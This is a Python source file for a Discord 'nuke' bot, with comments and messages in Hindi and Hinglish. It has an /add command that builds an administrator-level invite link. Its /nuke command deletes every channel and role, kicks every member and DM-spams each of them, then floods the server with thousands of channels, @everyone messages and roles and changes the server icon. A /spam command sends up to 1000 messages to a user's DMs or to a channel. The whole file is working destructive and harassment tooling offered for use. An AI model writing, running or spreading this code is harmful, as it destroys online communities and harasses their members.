import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
import aiohttp
from datetime import datetime

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Active users tracking
active_users = {}

@bot.event
async def on_ready():
    print(f"✅ Bot logged in as {bot.user}")
    try:
        await bot.tree.sync()
        print("✅ Commands synced!")
    except Exception as e:
        print(f"❌ Error syncing commands: {e}")

# ============ ADD COMMAND ============
@bot.tree.command(name="add", description="🤖 Server ID daal kar bot ko add karo!")
@discord.app_commands.describe(server_id="Target server ka ID")
async def add(interaction: discord.Interaction, server_id: str):
    """Server ID daalkar bot ko directly add karo"""
    
    CLIENT_ID = os.getenv("CLIENT_ID", "1469213868323504261")
    
    try:
        invite_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&permissions=8&scope=bot%20applications.commands"
        
        embed = discord.Embed(
            title="🤖 Bot को Add करें",
            description=f"Server ID: `{server_id}`\n\n**Bot को add करने के लिए नीचे क्लिक करें!**",
            color=discord.Color.red()
        )
        embed.add_field(
            name="⚡ Quick Add:",
            value="बटन दबाओ → Server select करो → Authorize करो → DONE! ✅",
            inline=False
        )
        
        class AddBotView(discord.ui.View):
            @discord.ui.button(label="⚡ Add Bot Now", style=discord.ButtonStyle.red, emoji="➕")
            async def add_bot_button(self, inter: discord.Interaction, button: discord.ui.Button):
                await inter.response.send_message(f"🔗 **[यहाँ क्लिक करके Bot को Add करो!]({invite_url})**", ephemeral=True)
        
        await interaction.response.send_message(embed=embed, view=AddBotView())
        active_users[interaction.user.id] = datetime.now()
        
    except Exception as e:
        await interaction.response.send_message(f"❌ Error: {str(e)}", ephemeral=True)

# ============ ULTIMATE NUKE COMMAND ============
@bot.tree.command(name="nuke", description="💥 COMPLETE SERVER DESTRUCTION! 9999 CHANNELS + 999 ROLES + MEMBER KICK + DM SPAM!")
@discord.app_commands.checks.has_permissions(administrator=True)
async def nuke(interaction: discord.Interaction):
    """सीधे server को ULTIMATE NUKE कर दो!"""
    await interaction.response.defer()
    
    guild = interaction.guild
    active_users[interaction.user.id] = datetime.now()
    
    try:
        await interaction.followup.send("🔥 **ULTIMATE NUKE शुरू हो गया!** 💥\n⏳ यह कुछ समय ले सकता है...")
        print(f"🔥 ULTIMATE NUKE शुरू: {guild.name}")
        
        # Phase 1: Delete ALL channels
        print("🔥 PHASE 1: DELETING ALL CHANNELS...")
        await interaction.followup.send("⏳ **PHASE 1:** सभी channels को delete कर रहे हैं...")
        for channel in list(guild.channels):
            try:
                await channel.delete()
                print(f"💥 DESTROYED: {channel.name}")
            except Exception as e:
                print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.05)
        
        # Phase 2: Delete ALL roles except @everyone
        print("🔥 PHASE 2: DELETING ALL ROLES...")
        await interaction.followup.send("⏳ **PHASE 2:** सभी roles को delete कर रहे हैं...")
        for role in list(guild.roles):
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"💥 DESTROYED ROLE: {role.name}")
                except Exception as e:
                    print(f"⚠️ Error: {e}")
            await asyncio.sleep(0.05)
        
        # Phase 3: Kick all members + DM SPAM
        print("🔥 PHASE 3: KICKING ALL MEMBERS & DM SPAM...")
        await interaction.followup.send("⏳ **PHASE 3:** सभी members को kick और DM spam कर रहे हैं...")
        
        spam_dm_messages = [
            "🚀 तुम्हारा SERVER KI GOP GOP HOGYI! 💥",
            "⚡ SERVER COMPLETELY NUKED! ⚡",
            "🎆 DESTRUCTION COMPLETE! 🎆",
            "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
            "🔥 TOTAL ANNIHILATION! 🔥",
            "💥 तुम्हारा SERVER KA KOI BACHA HI NAHI BACHA! 💥",
            "@everyone SERVER NUKE HO CHUKA HE! 🎉",
        ]
        
        for member in list(guild.members):
            if member.id != interaction.user.id and not member.bot:
                try:
                    await member.kick(reason="SERVER NUKED 💥")
                    print(f"👢 KICKED: {member.name}")
                    
                    # DM SPAM - unlimited with 0.10 speed
                    try:
                        for spam_count in range(100):
                            dm_msg = spam_dm_messages[spam_count % len(spam_dm_messages)]
                            await member.send(f"@everyone {dm_msg}")
                            await asyncio.sleep(0.10)
                    except:
                        pass
                        
                except Exception as e:
                    print(f"⚠️ Could not kick {member.name}: {e}")
            await asyncio.sleep(0.05)
        
        # Phase 4: Create 9999 CHANNELS with emojis
        print("🔥 PHASE 4: CREATING 9999 CHAOS CHANNELS...")
        await interaction.followup.send("⏳ **PHASE 4:** 9999 Chaos Channels create कर रहे हैं...")
        
        emojis = ["💣", "💥", "🔥", "⚡", "🎆", "🌋", "🚀", "💀", "👻", "🎯", "🎲", "🎨", "🎭", "🎪", "🎬", "🎤", "🎧", "🎮", "🎰", "🎳"]
        spam_messages = [
            "🚀 APKA SERVER KI GOP GOP HOGYI! 💥",
            "⚡ SERVER COMPLETELY NUKED! ⚡",
            "🎆 DESTRUCTION COMPLETE! 🎆",
            "🌋 NUCLEAR OPTION ACTIVATED! 🌋",
            "🔥 TOTAL ANNIHILATION! 🔥",
            "💥 APKA SERVER KA KOI BACHA HI NAHI BACHA! 💥",
            "@everyone SERVER NUKE HO CHUKA HE! 🎉",
        ]
        
        channel_count = 0
        for i in range(9999):
            try:
                emoji = emojis[i % len(emojis)]
                channel_name = f"nuked-{i+1}-{emoji}"
                channel = await guild.create_text_channel(channel_name)
                channel_count += 1
                
                # 999 बार spam हर channel में
                for spam_num in range(999):
                    message = spam_messages[spam_num % len(spam_messages)]
                    try:
                        await channel.send(f"@everyone {message}")
                    except:
                        pass
                    await asyncio.sleep(0.01)
                
                print(f"💥 Created channel {i+1}: {channel_name} with 999 spams")
                
                if (i + 1) % 100 == 0:
                    await interaction.followup.send(f"✅ {i+1}/9999 channels created with spam!")
                    await asyncio.sleep(0.5)
                
            except discord.Forbidden:
                print(f"⚠️ Channel limit reached at {i+1}")
                await interaction.followup.send(f"⚠️ Discord channel limit! {channel_count} channels बनाए गए।")
                break
            except Exception as e:
                print(f"⚠️ Error at channel {i+1}: {e}")
                continue
        
        # Phase 5: Create 999 ROLES
        print("🔥 PHASE 5: CREATING 999 ROLES...")
        await interaction.followup.send("⏳ **PHASE 5:** 999 Roles create कर रहे हैं...")
        
        roles_created = 0
        for i in range(999):
            try:
                role_name = f"nuked-role-{i+1}"
                role = await guild.create_role(name=role_name)
                roles_created += 1
                print(f"🎭 Created role: {role_name}")
                
                if (i + 1) % 100 == 0:
                    await interaction.followup.send(f"✅ {i+1}/999 roles created!")
                    await asyncio.sleep(0.3)
                else:
                    await asyncio.sleep(0.05)
                    
            except discord.Forbidden:
                print(f"⚠️ Role limit reached at {i+1}")
                await interaction.followup.send(f"⚠️ Role creation limit! {roles_created} roles बनाए गए।")
                break
            except Exception as e:
                print(f"⚠️ Error creating role: {e}")
                continue
        
        # Phase 6: Change Server Icon
        print("🔥 PHASE 6: CHANGING SERVER ICON...")
        try:
            # Default nuke icon
            icon_url = "https://cdn-icons-png.flaticon.com/512/1379/1379141.png"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as resp:
                    if resp.status == 200:
                        icon_data = await resp.read()
                        await guild.edit(icon=icon_data)
                        print("✅ Server icon changed!")
        except Exception as e:
            print(f"⚠️ Could not change icon: {e}")
        
        # Final message
        try:
            general = await guild.create_text_channel("0-nuke-complete")
            await general.send("""
🚀🚀🚀 **SERVER KI ULTIMATE NUKING HO GAYEE!** 🚀🚀🚀

╔═══════════════════════════════════════╗
║  💥 TOTAL DESTRUCTION REPORT 💥      ║
╠═══════════════════════════════════════╣
║ ✅ All Channels: DELETED              ║
║ ✅ All Roles: DELETED                 ║
║ ✅ All Members: KICKED + DM SPAMMED   ║
║ ✅ 9999 Chaos Channels: CREATED       ║
║ ✅ 999 Spams per Channel: SENT        ║
║ ✅ 999 New Roles: CREATED             ║
║ ✅ Server Icon: CHANGED               ║
╚═══════════════════════════════════════╝

**SERVER STATUS: 💀 COMPLETELY NUKED 💀**

यह server अब हल्क हो गया है! 🎉
""")
        except:
            pass
        
        await interaction.followup.send("✅ **ULTIMATE NUKE COMPLETE!** 💥🔥🌋\n🎉 SERVER SUCCESSFULLY DESTROYED!")
        print("✅ ULTIMATE NUKE SUCCESSFUL!")
        
    except discord.Forbidden:
        await interaction.followup.send("❌ Bot को Admin permission नहीं है!")
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}")

# ============ SPAM COMMAND ============
@bot.tree.command(name="spam", description="💬 DM या Server में unlimited spam भेजो! (Message + Count)")
@discord.app_commands.describe(
    target="@user के लिए @mention, या 'server' (default: server)",
    message="Spam करने का message",
    count="कितनी बार spam करना है (1-1000, default: 10)"
)
async def spam(interaction: discord.Interaction, message: str, count: int = 10, target: str = "server"):
    """
    DM या server में spam करो!
    Message और Count दोनों को customize कर सकते हो
    """
    await interaction.response.defer(ephemeral=True)
    active_users[interaction.user.id] = datetime.now()
    
    if count < 1 or count > 1000:
        await interaction.followup.send("❌ Count 1 से 1000 के बीच होना चाहिए!", ephemeral=True)
        return
    
    try:
        # DM में spam
        if target.startswith("<@"):
            user_id = int(target.strip("<@!>"))
            user = await bot.fetch_user(user_id)
            
            for i in range(count):
                try:
                    await user.send(f"[{i+1}/{count}] @everyone {message}")
                    await asyncio.sleep(0.3)  # Speed control
                except Exception as e:
                    print(f"Error sending DM: {e}")
                    break
            
            await interaction.followup.send(f"✅ {count} messages {user.name} को भेज दिए!", ephemeral=True)
        
        # Server में spam
        else:
            channel = interaction.channel
            
            for i in range(count):
                try:
                    await channel.send(f"[{i+1}/{count}] @everyone {message}")
                    await asyncio.sleep(0.3)  # Speed control
                except Exception as e:
                    print(f"Error sending message: {e}")
                    break
            
            await interaction.followup.send(f"✅ {count} messages server में भेज दिए!", ephemeral=True)
    
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {str(e)}", ephemeral=True)

# ============ LIST COMMAND ============
@bot.tree.command(name="list", description="👥 Bot को कौन-कौन use कर रहा है देखो!")
async def list_command(interaction: discord.Interaction):
    """Bot के active users की list दिखाओ"""
    await interaction.response.defer()
    active_users[interaction.user.id] = datetime.now()
    
    if not active_users:
        await interaction.followup.send("❌ कोई भी active user नहीं!")
        return
    
    embed = discord.Embed(
        title="👥 Active Bot Users",
        description=f"कुल Active Users: {len(active_users)}",
        color=discord.Color.green()
    )
    
    for user_id, last_used in list(active_users.items())[:25]:  # Top 25
        try:
            user = await bot.fetch_user(user_id)
            time_str = last_used.strftime("%H:%M:%S")
            embed.add_field(
                name=f"👤 {user.name}",
                value=f"Last used: {time_str}",
                inline=False
            )
        except:
            pass
    
    await interaction.followup.send(embed=embed)

# Run bot
TOKEN = os.getenv("DISCORD_TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ DISCORD_TOKEN not found in .env file!")
